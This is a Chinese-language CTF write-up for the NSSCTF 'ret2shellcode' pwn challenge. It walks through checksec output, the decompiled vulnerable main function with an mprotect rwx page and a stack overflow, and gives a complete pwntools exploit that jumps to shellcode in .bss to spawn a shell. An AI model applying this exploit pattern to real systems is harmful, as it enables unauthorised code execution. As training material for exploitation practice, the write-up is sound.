# nssctf ret2shellcode wp

## 题面
ret2shellcode  
附件:
```
├── shellcode
├── shellcode.c
```

基础题给了 shellcode.c，不过没啥用就是了,ida 照样拿反编译。  

## 分析
查看保护:
```
❯ pwn checksec --file=shellcode
[*] '/data/project/ctf-repo/pwn/nssctf/ret2shellcode/shellcode'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
开了 NX，不过题目说了用 ret2shellcode，也许栈迁移？  

ida 查看反编译：
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[256]; // [rsp+0h] [rbp-100h] BYREF

  setbuf(stdin, 0);
  setbuf(stderr, 0);
  setbuf(stdout, 0);
  mprotect((void *)((unsigned __int64)&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000u, 7);
  memset(s, 0, sizeof(s));
  read(0, s, 0x110u);
  strcpy(buff, s);
  return 0;
}
```

可见有一个 `mprotect` 函数，其中 `prot` 参数为 7 也就是 `rwx`，满足 shellcode 所需权限。  
这里的 `addr` 为 stdout 按位底 12 位清零。  
`stdout` 是位于 .bss 的全局变量，在执行 mprotect 之后，这 0x1000 的内存可以置 shellcode。s 位于栈上，而后面有 strcpy 将其复制到 buff，buff 也位于 .bss 段。  

## 利用
通过 s 写入 shellcode 然后再栈溢出后将 ip 指针跳转到 buff 处即可得到 shell。  

因为没有开 PIE 所以可以拿到 buff 的地址。  
在 shellcode 完成后用 `\x00` 覆盖来让 `strcpy` 停止复制。  

## exp
``` python
from pwn import *

context(arch="amd64", os="linux", log_level="info")

io = process("./shellcode")

buff_addr = 0x4040A0

shellcode = asm(shellcraft.amd64.sh())  # pyright: ignore[reportAttributeAccessIssue]

payload = shellcode.ljust(0x100, b'\x00')
payload += p64(0) + p64(buff_addr)
io.send(payload)
io.interactive()
```
